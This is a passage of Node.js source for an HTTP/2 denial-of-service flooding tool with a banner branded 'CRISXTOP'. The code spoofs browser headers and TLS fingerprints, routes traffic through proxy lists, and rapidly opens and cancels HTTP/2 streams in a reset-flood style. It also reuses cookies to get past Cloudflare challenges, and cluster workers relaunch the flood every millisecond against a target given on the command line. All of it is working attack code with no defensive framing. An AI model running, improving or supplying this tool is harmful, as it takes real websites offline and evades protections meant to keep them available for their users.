            ...additionalHeaders,
            "cache-control": cache[Math.floor(Math.random() * cache.length)],
            "user-agent": userAgents["opera"],
            "accept-encoding": acceptEncoding,
            "accept-language": languages(),
            "sec-ch-ua-full-version": getSecChUaFullVersion("opera"),
            
         },
                operagx: {
            ":method": httpMethod,
            ":authority":parsedTarget.host,
            ":scheme": "https",
            ":path": pathValue,
            "sec-ch-ua": getSecChUaHeader("operagx"),
            "sec-ch-ua-platform": getSecChUaPlatform("operagx"),
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            "sec-fetch-dest": "document",
            ...additionalHeaders,
            "Pragma" : "no-cache",
            "cache-control": cache[Math.floor(Math.random() * cache.length)],
            "user-agent": userAgents["operagx"],
            "accept-encoding": acceptEncoding,
            "accept-language": languages(),
            "sec-ch-ua-full-version": getSecChUaFullVersion("operagx"),
            
         }
    };
  
    return headersMap[browser];
};
const browser = getRandomBrowser();
    const headers = generateHeaders(browser);
      
const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};
const connectionType = enabled('socks5') ? Socker.SOCKS5 : Socker.HTTP;

connectionType(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 60000); 
    connection.setNoDelay(true);          

    const settings = {
        initialWindowSize: 15663105,
    };
    
    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        maxRedirects: 20,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        followAllRedirects: true,
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, async () => {
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);

});
async function generateJA3Fingerprint(socket) {
    if (!socket.getCipher()) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();
    const tlsVersion = supportedVersions.split('/')[0];

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${tlsVersion}:${cipherInfo.bits}`;
    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}

tlsSocket.on('secureConnect', async () => {
    const ja3Fingerprint = await generateJA3Fingerprint(tlsSocket);
    headers["ja3"] = ja3Fingerprint;
});

tlsSocket.on('error', () => {
tlsSocket.end(() => tlsSocket.destroy())
})



    let clasq = shuffleObject({
        ...(Math.random() < 0.5 ? { headerTableSize: 65536 } : {}),
        ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
        ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
        enablePush:false,
        ...(Math.random() < 0.5 ? {maxConcurrentStreams: 6291456} : {}),
        ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
        ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
        ...(Math.random() < 0.5 ? {maxFrameSize: 6291456} : {}),
    });
function incrementClasqValues() {
    if (clasq.headerTableSize) clasq.headerTableSize += 1;
    if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
    if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
    if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
    if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
    return clasq;
}
setTimeout(() => {
    incrementClasqValues();
    const payload = Buffer.from(JSON.stringify(clasq));
    const frames = encodeFrame(0, 4, payload, 0);
}, 10000);
let dataBuffer = Buffer.alloc(0);

tlsSocket.on('data', (eventData) => {
    dataBuffer = Buffer.concat([dataBuffer, eventData]);

    while (dataBuffer.length >= 9) {
        const frame = decodeFrame(dataBuffer);

        if (frame != null) {
            dataBuffer = dataBuffer.slice(frame.len + 9);

            switch (frame.type) {
                case 4:
                    if (frame.flags === 0) {
                        tlsSocket.write(encodeFrame(0, 4, "", 1));
                    }
                    break;

                case 0:
                    const updateWindow = Buffer.alloc(8);
                    const newWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 65535)) + 65535;
                    updateWindow.writeUInt32BE(newWindowSize, 0);

                    tlsSocket.write(encodeFrame(0, 8, updateWindow));
                    break;


                case 7:
                     tlsSocket.write(encodeRstStream(0, 3, 0));
                     tlsSocket.end(() => tlsSocket.destroy());
                     break;


                default:
                    break;
            }
        } else {
            break;
        }
    }
});


    let hpack = new HPACK();
    hpack.setTableSize(4096);
    const clients = [];
let client;

client = http2.connect(parsedTarget.href, {
    protocol: 'https',
    createConnection: () => tlsSocket,
    unknownProtocolTimeout: 10,
    maxReservedRemoteStreams: 4000,
    maxSessionMemory: 400,
    settings: incrementClasqValues(),
    socket: tlsSocket,
});

clients.push(client);
client.setMaxListeners(0);

client.on('connect', () => {
    client.ping((err, duration, payload) => {
        if (err) {
        } else {
        }
    });
});




function delay(seconds) {
    return new Promise(resolve => setTimeout(resolve, seconds * 1000));
}
    clients.forEach(client => {
        const intervalId = setInterval(() => {
        async function sendRequests()  {
            let streamIdReset = 0;
         const randomString = () => [...Array(15)].map(() => Math.random().toString(20).charAt(2)).join('');

         let brandValue;
         let randrate = getRandomInt(1, 90);
         let currenthead = 0;
         let streamId = 1;
         let ssssssss = ['Google Chrome', 'Brave'];
         let asasas = ssssssss[Math.floor(Math.random() * ssssssss.length)];
         if (nodeii >= 120 && nodeii <= 128) {
             const brandMapping = {
                 120: `"Not_A Brand";v="8", "Chromium";v="${nodeii}", "${asasas}";v="${nodeii}"`,
                 121: `"Not A(Brand";v="99", "${asasas}";v="${nodeii}", "Chromium";v="${nodeii}"`,
                 122: `"Chromium";v="${nodeii}", "Not(A:Brand";v="24", "${asasas}";v="${nodeii}"`,
                 123: `"${asasas}";v="${nodeii}", "Not:A-Brand";v="8", "Chromium";v="${nodeii}"`,
                 124: `"Not_A Brand";v="8", "Chromium";v="${nodeii}", "${asasas}";v="${nodeii}"`,
                 125: `"Chromium";v="${nodeii}", "${asasas}";v="${nodeii}", "Not:A-Brand";v="99"`,
                 126: `"${asasas}";v="${nodeii}", "Chromium";v="${nodeii}", "Not_A Brand";v="24"`,
                 127: `"Not:A-Brand";v="8", "${asasas}";v="${nodeii}", "Chromium";v="${nodeii}"`,
                 128: `"Chromium";v="${nodeii}", "Not:A-Brand";v="99", "${asasas}";v="${nodeii}"`
             };
             brandValue = brandMapping[nodeii];
         }
         
         const headers2 = (currenthead) => {
             let updatedHeaders = {};
             let randomStr = randomString();
         
             const commonHeaders = {
                 "sec-ch-ua": brandValue || `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`,
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": "Windows",
                 "upgrade-insecure-requests": "1",
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
             };
         
             switch (currenthead) {
                 case 1:
                     updatedHeaders["sec-ch-ua-platform"] = "NEW-WINDOWS" + randomStr;
                     break;
                 case 2:
                     updatedHeaders["sec-ch-ua-mobile"] = randomStr;
                     break;
                 case 3:
                     updatedHeaders["sec-ch-ua-platform"] = randomStr;
                     break;
                 case 4:
                     updatedHeaders["upgrade-insecure-requests"] = randomStr;
                     break;
                 case 6:
                     updatedHeaders["accept"] = randomStr;
                     break;
                 case 7:
                     updatedHeaders["sec-fetch-site"] = randomStr;
                     break;
                 case 8:
                     updatedHeaders["sec-fetch-mode"] = randomStr;
                     break;
                 case 9:
                     updatedHeaders["sec-fetch-user"] = randomStr;
                     break;
                 case 10:
                     updatedHeaders["sec-fetch-dest"] = randomStr;
                     break;
                 case 11:
                     updatedHeaders["accept-encoding"] = randomStr;
                     break;
                 case 12:
                     updatedHeaders["accept-encoding"] = "gzip, deflate, br, zstd";
                     break;
                 default:
                     break;
             }
         
             return { ...commonHeaders, ...updatedHeaders };
         };
         
         if (streamId >= Math.floor(randrate / 2)) {
             let updatedHeaders = headers2(currenthead);
             Object.entries(updatedHeaders).forEach(([key, value]) => {
                 if (!headers.some(h => h[0] === key.trim())) {
                     headers.push([key.trim(), value.trim()]);
                 }
             });
         }
         const fianl = headers2(currenthead);

function sub(obj1, obj2) {
    let entries = [
        ...Object.entries(obj1),
        ...Object.entries(obj2)
    ];

    for (let i = entries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [entries[i], entries[j]] = [entries[j], entries[i]];
    }

    return Object.fromEntries(entries);
}
let dynHeaders1 = taoDoiTuongNgauNhien();
let dynHeaders2 = taoDoiTuongNgauNhien();
let shuffledHeaders = sub(dynHeaders1, dynHeaders2);
let randagent = generateRandomString(200, 700) + `Mozilla/5.0 (Windows NT ${number(1,11)}.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36` + getRandomInt(1000, 9999) + '.' + getRandomInt(1000, 9999)
if (enabled('randagent')) {
headers["user-agent"] =randagent;
}
    var head = {
    ...shuffledHeaders,
    ...headers,
    ...fianl,
  
    
};
            let statusCodes = [];
            let count = 0;
            const delayTime = enabled('delay') ? getRandomInt(0, 20) : 0;
            const increaseRequestRate = async (client, head, args, tlsSocket) => {
                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) return;
                
                    const requests = [];
                    const requests1 = [];
                                    
                                   for (let i = 0; i < args.Rate; i++) {
                                    
                                    const priorityWeight = Math.floor(Math.random() * 256); 
                                        const requestPromise = new Promise((resolve, reject) => {
                                            const req = client.request(head, {
                                                priority : 1,
                                                weight: priorityWeight,
                                                parent:0,
                                                exclusive: true,
                                               
                                            });
                                            req.setEncoding('utf8');
                                            let data = Buffer.alloc(0);
                                            req.on('data', (chunk) => {
                                            data += chunk;
                                            });
                                            req.on('response', (res) => {
                                            if (enabled('status')) {
                                            const status = res[':status'];
                                            let coloredStatus;
                                            if (status < 500 && status >= 400 && status !== 404) {
                                            delay(5);
                                            coloredStatus = status.toString().red;
                                            } else if (status >= 300 && status < 400) {
                                            delay(5);
                                            coloredStatus = status.toString().yellow;
                                            } else if (status == 503) {
                                            delay(5);
                                            coloredStatus = status.toString().cyan;
                                            } else {
                                            delay(5);
                                            coloredStatus = status.toString().green;
                                             }
                                             statusCodes.push(coloredStatus);
                                             setTimeout(() => {
                                             console.log(`Status Codes: ${statusCodes.join(' ')} | Proxy: ${colors.cyan(`${parsedProxy[0]}:${parsedProxy[1]}`)}`);
                                             if (enabled('ipv6')) {
                                             console.log(`Status Codes: ${statusCodes.join(' ')} | Proxy: ${colors.cyan(`${parsedProxy[0]}:${parsedProxy[1]}:${parsedProxy[2]}:${parsedProxy[3]}`)}`);
                                             }
}, 5000);
};



                                                 //Reset Mechanism
                                                    
                                                 
                                                   if (enabled('reset')) {
                                                     const handleRequestReset = async () => {
                                                     while (true) {
                                                     try {
                                                     
                                                     req.close(http2.constants.NGHTTP2_CANCEL);
                                                     count++;
                                                     if (count >= args.time * args.Rate) {
                                                     break;
                                                     }
                                                     
                                                     await new Promise(resolve => setTimeout(resolve, 0));
                                                     } catch (error) {
                                                     break;
                                                     }
                                                     }
                                                     };
                                                     handleRequestReset();
                                                     } else {
                                                     req.close(http2.constants.NGHTTP2_CANCEL);
                                                     req.destroy();
                                                     }

                                                 
                                             


                                  if (enabled('cookie')) {
                                            const cookies = res.headers['set-cookie'];
                                            if (cookies && Array.isArray(cookies)) {
                                            const hasCfChl = cookies.some(cookie => cookie.includes("cf_chl"));
                                            if (!hasCfChl || cookies.length > 32) {
                                            headers['cookie'] = cookies.join('; ');
                                            }
                                            }
                                            }

                                                
                                                resolve(data);
                                                });
                                            
                                                req.on('end', () => {
                                                    count++;
                                                    if (count === args.time * args.Rate) {
                                                        clearInterval(intervalId);
                                                        client.close(http2.constants.NGHTTP2_CANCEL);
                                                        client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                                                    } else if (count === args.Rate) {
                                                        client.close(http2.constants.NGHTTP2_CANCEL);
                                                        client.destroy();
                                                        clearInterval(intervalId);
                                                    }
                                                    reject(new Error('Request timed out'));
                                                });
                                                req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                                            });
        
                                        
                                
                                            const packed = Buffer.concat([
                                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                                hpack.encode(head)
                                            ]);
                                
                                             
                                             const flags = 0x1 | 0x4 | 0x8 | 0x20;
                                             const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                                            const frame = Buffer.concat([encodedFrame]);
                                
                                            if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                            tlsSocket.write(Buffer.concat([encodeFrame(streamId, data, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                                            frame
                                            
                                        ]));
                                           } else if (streamIdReset >= 2 && (streamIdReset - 2) % 4 === 0) {
                                            tlsSocket.write(Buffer.concat([Buffer.from(streamId),Buffer.from(data),Buffer.from([0x0, 0x0, 0x8, 0x0]),frames
                                            
                                        ]));
    
                                            }
                                            
    
                                            streamIdReset+= 2;
                                            streamId += 2;
                                            data +=2;
    
                                            requests.push({ requestPromise, frame });
                                           await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                                           if (enabled('delay')) {
                                            await new Promise(resolve => setTimeout(resolve, delayTime));
                                        }
                                            
                                    }
                                }
                                if (enabled('randrate')) {
                                    const randomDelay = Math.random() < 0.5 ? 500 : 1000 / randrate;
                                    setTimeout(async() => await increaseRequestRate(client, head, args, tlsSocket), randomDelay);
                                    } else {
                                        await increaseRequestRate(client, head, args, tlsSocket);
                                    }
                                }
                                    
                                   sendRequests();
                                       
                            }, 500)
                        })
                        
                    
                  
                  client.on('error', (error) => {
    if (["ERR_HTTP2_GOAWAY_SESSION", "ECONNRESET", "ERR_HTTP2_ERROR"].includes(error.code)) {
        client.close();
    }
    
    client.destroy();
    if (socket) socket.destroy();
    if (connection) connection.destroy();
    if (tlsSocket) {
        tlsSocket.end(() => {
            tlsSocket.destroy();
        });
    }
    return runFlooder();
});

  })
}

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 10;
if (cluster.isMaster) {
    console.clear();
    console.log('HEAP SIZE:', (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2), 'MB');
    console.log('@needmoreloli'.bgRed);
    console.log('[!] CRISXTOP');
    console.log('--------------------------------------------'.gray);
    console.log('Target: '.red + process.argv[2].white);
    console.log('Time: '.red + process.argv[3].white);
    console.log('Rate: '.red + process.argv[4].white);
    console.log('Threads: '.red + args.threads);
    console.log('ProxyFile: '.red + process.argv[6].white);
    console.log('--------------------------------------------'.gray);
    console.log('Note: Only work on http/2 or http/1.1'.brightCyan);

    const restartScript = () => {
        console.log('[>] Restarting the script in', RESTART_DELAY, 'ms...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }



    const stopScript = () => {
        console.log('[>] Stopping script...');
        process.exit(1);
    };

    setTimeout(stopScript, args.time * 1000);

    process.on('uncaughtException', (error) => {
        console.error('[Error] Uncaught Exception:', error);
    });

    process.on('unhandledRejection', (error) => {
        console.error('[Error] Unhandled Rejection:', error);
    });

} else {
    setInterval(() => {
        runFlooder();
    }, 1);
}
